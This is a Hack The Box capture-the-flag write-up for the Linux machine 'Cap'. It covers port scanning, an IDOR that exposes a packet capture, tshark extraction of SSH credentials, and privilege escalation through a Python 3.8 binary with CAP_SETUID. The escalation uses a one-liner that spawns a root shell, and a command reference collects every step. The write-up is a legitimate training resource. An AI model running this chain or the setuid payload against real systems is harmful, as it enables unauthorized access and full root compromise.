# Hack The Box — Cap

> **Platform:** Hack The Box  
> **Target:** Cap  
> **OS:** Linux  
> **Difficulty:** Easy  
> **Focus:** Network enumeration, web enumeration, IDOR, PCAP analysis, credential discovery, SSH, Linux capabilities, privilege escalation

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Initial Enumeration](#2-initial-enumeration)
- [3. Web Enumeration](#3-web-enumeration)
- [4. Identifying the IDOR](#4-identifying-the-idor)
- [5. Analyzing the PCAP](#5-analyzing-the-pcap)
- [6. Credential Discovery](#6-credential-discovery)
- [7. SSH Access as Nathan](#7-ssh-access-as-nathan)
- [8. Local Privilege Escalation Enumeration](#8-local-privilege-escalation-enumeration)
- [9. Discovering Linux Capabilities](#9-discovering-linux-capabilities)
- [10. Privilege Escalation via Python](#10-privilege-escalation-via-python)
- [11. Root Access](#11-root-access)
- [12. Attack Chain](#12-attack-chain)
- [13. Key Takeaways](#13-key-takeaways)
- [14. Command Reference](#14-command-reference)

---

# 1. Overview

Cap is a Linux machine that can be compromised by chaining an insecure web application reference with exposed network traffic and a misconfigured Linux capability.

The attack path was:

```text
Port Enumeration
        ↓
HTTP Service
        ↓
Web Dashboard
        ↓
IDOR in /data/<id>
        ↓
Unauthorized PCAP Access
        ↓
PCAP Analysis with TShark
        ↓
Credential Discovery
        ↓
SSH as nathan
        ↓
Local Enumeration
        ↓
Linux Capabilities
        ↓
Python 3.8 with CAP_SETUID
        ↓
setuid(0)
        ↓
root
```

The initial access was obtained through the web application. After recovering credentials from an exposed network capture, those credentials were reused to access SSH. The final privilege escalation was possible because `/usr/bin/python3.8` had the `CAP_SETUID` capability.

---

# 2. Initial Enumeration

I started by checking whether the target was reachable:

```bash
ping -c 1 10.10.10.245 -R
```

The response showed a TTL of 63, which is consistent with a Linux target in the Hack The Box environment.

Another way to verify that the host is reachable is:

```bash
nmap -sn 10.10.10.245
```

The host was reported as up.

I then performed a full TCP port scan:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG Escaneo
```

The scan identified three relevant services:

```text
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
```

I then performed service and version detection:

```bash
nmap -sCV -p21,22,80 10.10.10.245
```

The SSH version did not immediately provide a useful initial access vector, and the FTP service did not reveal an obvious route to compromise.

Therefore, I focused on the HTTP service running on port 80.

---

# 3. Web Enumeration

I first fingerprinted the web application:

```bash
whatweb http://10.10.10.245
```

The web page presented a dashboard-style interface related to network data capture.

The application exposed functionality around a **Security Snapshot**, reachable through:

```text
/capture
```

The dashboard also exposed information such as the username:

```text
Nathan
```

At this point, I investigated how the application handled generated captures.

The interesting behaviour was that capture results were referenced by numeric identifiers, for example:

```text
/data/6
```

and later:

```text
/data/2
```

This made the object identifier a good candidate for an authorization test.

---

# 4. Identifying the IDOR

I manually changed the identifier in the URL.

For example:

```text
http://10.10.10.245/data/0
```

The server returned a downloadable capture even though that resource had not been generated through the normal workflow.

This indicated that changing the object identifier was enough to access another resource.

This is characteristic of an **IDOR (Insecure Direct Object Reference)** vulnerability.

## What is IDOR?

An IDOR occurs when an application exposes a direct reference to an internal object, such as:

- A database record
- A file
- A report
- A capture
- A user ID

without properly checking whether the current user is authorized to access it.

In this case, the application exposed resources through:

```text
/data/<id>
```

and changing `<id>` allowed access to another capture.

The vulnerability was therefore not the use of numeric identifiers itself, but the lack of proper authorization validation.

---

# 5. Analyzing the PCAP

The downloaded resource was a packet capture:

```text
0.pcap
```

I used `tshark` to extract the TCP payload from the capture:

```bash
tshark -r 0.pcap -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
```

## Command breakdown

### `tshark -r 0.pcap`

`tshark` is the command-line interface for Wireshark and can be used to inspect packet captures.

The `-r` option specifies the input capture:

```text
0.pcap
```

### `-Tfields`

This tells `tshark` to output selected fields rather than the complete packet information.

### `-e tcp.payload`

This extracts the TCP payload, which contains the application-layer data carried by TCP.

### `2>/dev/null`

The error stream is redirected to `/dev/null` so that warnings and other error messages do not interfere with the useful output.

### `|`

The pipe forwards the output of `tshark` to `xxd`.

### `xxd -ps -r`

The extracted payload is represented as hexadecimal data. `xxd` converts it back into its original representation.

The resulting output contained readable application-layer data, including authentication information.

---

# 6. Credential Discovery

The recovered network traffic revealed credentials that could be reused against the SSH service.

The relevant account was:

```text
Username: nathan
```

and the capture exposed the corresponding password.

This created the following chain:

```text
IDOR
 ↓
Unauthorized PCAP
 ↓
Network traffic analysis
 ↓
Credential disclosure
 ↓
SSH
```

The important lesson is that packet captures can contain sensitive information such as usernames, passwords, tokens, and other application data, depending on the protocols and encryption used.

---

# 7. SSH Access as Nathan

With the recovered credentials, I connected to the target through SSH:

```bash
ssh nathan@10.10.10.245
```

I verified the current account:

```bash
whoami
```

The result was:

```text
nathan
```

The user flag could then be retrieved:

```bash
cat ~/user.txt
```

At this point, I had converted the web application vulnerability into a stable operating-system session.

The next objective was privilege escalation.

---

# 8. Local Privilege Escalation Enumeration

I first checked the current identity:

```bash
id
```

and the user's sudo privileges:

```bash
sudo -l
```

There was no useful sudo-based escalation path.

I then searched for SUID binaries:

```bash
find / -perm -4000 -user root 2>/dev/null | xargs ls -l
```

The results mainly contained standard system binaries such as:

```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
```

Nothing immediately stood out as a custom or unusually configured SUID binary.

At this point, I moved on to Linux capabilities.

---

# 9. Discovering Linux Capabilities

Linux capabilities provide a more granular permission model than traditional SUID execution.

Instead of assigning a process the complete set of root privileges, individual privileged operations can be granted through capabilities.

I searched recursively for binaries with capabilities assigned:

```bash
getcap -r / 2>/dev/null
```

Among the results was:

```text
/usr/bin/python3.8
```

with capabilities including:

```text
cap_net_bind_service
cap_setuid
```

The important one was:

```text
cap_setuid
```

## Why is `CAP_SETUID` important?

`CAP_SETUID` allows a process to change its UID.

Normally, an unprivileged user cannot simply run:

```python
os.setuid(0)
```

and become root.

However, a process running with `CAP_SETUID` can perform that operation.

Because Python is an interpreter capable of executing arbitrary Python code, a Python binary with `CAP_SETUID` can potentially be abused to change its UID to `0`.

This provides a direct privilege-escalation path.

---

# 10. Privilege Escalation via Python

The vulnerable Python binary can be abused with a short Python one-liner:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```

Let's break it down.

### Execute Python code

```text
python3.8 -c
```

The `-c` option tells Python to execute the supplied command string.

### Import the operating-system interface

```python
import os
```

This provides access to operating-system functions.

### Change the UID

```python
os.setuid(0)
```

UID `0` corresponds to the root account.

Because the Python binary has `CAP_SETUID`, the process is allowed to perform this operation.

### Spawn Bash

```python
os.system("bash")
```

After changing the UID to `0`, Bash is executed from the privileged process.

The complete payload is therefore:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```

---

# 11. Root Access

After executing the Python command, I verified the current account:

```bash
whoami
```

The result was:

```text
root
```

The root flag could then be retrieved with:

```bash
cat /root/root.txt
```

This completed the privilege-escalation chain.

---

# 12. Attack Chain

The complete compromise can be summarized as:

```text
┌──────────────────────────────────┐
│ 1. Port Enumeration              │
│    FTP / SSH / HTTP              │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 2. Web Dashboard                 │
│    Network capture functionality │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 3. IDOR                          │
│    /data/<id>                    │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 4. Unauthorized PCAP Access      │
│    0.pcap                        │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 5. TShark Analysis               │
│    Extract TCP payload           │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 6. Credential Discovery          │
│    nathan                         │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 7. SSH Access                    │
│    nathan                         │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 8. Local Enumeration              │
│    SUID / Capabilities           │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 9. Python 3.8                    │
│    CAP_SETUID                    │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 10. os.setuid(0)                 │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 11. Root shell                   │
└──────────────────────────────────┘
```

---

# 13. Key Takeaways

### 1. Enumerate all exposed services

The initial scan revealed:

```text
21 FTP
22 SSH
80 HTTP
```

Full service enumeration provides the context needed to decide where to focus next.

---

### 2. Test direct object references

Whenever an application exposes URLs such as:

```text
/data/1
/data/2
/data/3
```

test whether changing the identifier allows access to another user's data.

The key issue is whether the application performs proper authorization checks.

---

### 3. PCAP files should be treated as sensitive

A packet capture can expose credentials and other sensitive information depending on the traffic it contains.

Useful tools for analyzing captures include:

```text
Wireshark
tshark
tcpdump
```

---

### 4. Local enumeration is essential

The initial Nmap scan only showed remotely accessible services.

After obtaining SSH access, local enumeration revealed additional attack-surface information that could not be observed externally.

A standard Linux privilege-escalation checklist should therefore include:

```text
sudo
SUID
Capabilities
Cron jobs
Processes
Services
Writable files
Credentials
```

---

### 5. Do not focus only on SUID

The absence of an interesting SUID binary does not mean that privilege escalation is impossible.

Linux capabilities can provide powerful privileges without using SUID.

A useful enumeration command is:

```bash
getcap -r / 2>/dev/null
```

---

### 6. `CAP_SETUID` on an interpreter is dangerous

A powerful interpreter such as Python with `CAP_SETUID` can potentially change its UID to `0`.

The dangerous combination is:

```text
Powerful interpreter
        +
CAP_SETUID
        =
Potential root shell
```

Capabilities should therefore be granted only when strictly necessary.

---

### 7. Think in attack chains

The compromise of Cap was not based on a single vulnerability:

```text
IDOR
 ↓
Sensitive PCAP
 ↓
Credential Disclosure
 ↓
SSH Access
 ↓
Misconfigured Capability
 ↓
root
```

The individual weaknesses became much more impactful when chained together.

---

# 14. Command Reference

## Host discovery

```bash
ping -c 1 10.10.10.245 -R
```

```bash
nmap -sn 10.10.10.245
```

## Full port scan

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG Escaneo
```

## Service enumeration

```bash
nmap -sCV -p21,22,80 10.10.10.245
```

## Web fingerprinting

```bash
whatweb http://10.10.10.245
```

## PCAP analysis

```bash
tshark -r 0.pcap -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
```

## SSH access

```bash
ssh nathan@10.10.10.245
```

## User identification

```bash
whoami
```

```bash
id
```

## Sudo enumeration

```bash
sudo -l
```

## SUID enumeration

```bash
find / -perm -4000 -user root 2>/dev/null | xargs ls -l
```

## Linux capabilities

```bash
getcap -r / 2>/dev/null
```

## Privilege escalation

```bash
python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```

## Verify root

```bash
whoami
```

## Root flag

```bash
cat /root/root.txt
```

---

# Final Notes

Cap demonstrates a complete penetration-testing chain where each stage provides the information needed for the next one.

The web application exposed an IDOR vulnerability that allowed access to a packet capture. Analysis of that capture revealed credentials, which were then reused to obtain SSH access as `nathan`.

After establishing local access, privilege-escalation enumeration revealed that `/usr/bin/python3.8` had the `CAP_SETUID` capability. This allowed the process to change its UID to `0` and spawn a root shell.

The final attack chain was:

```text
Web Enumeration
      ↓
IDOR
      ↓
PCAP Disclosure
      ↓
Credential Discovery
      ↓
SSH as nathan
      ↓
Local Enumeration
      ↓
Linux Capabilities
      ↓
CAP_SETUID
      ↓
root
```

**The key lesson from Cap is to keep enumerating after every successful step. A low-privileged foothold can expose an entirely new attack surface from inside the target.**
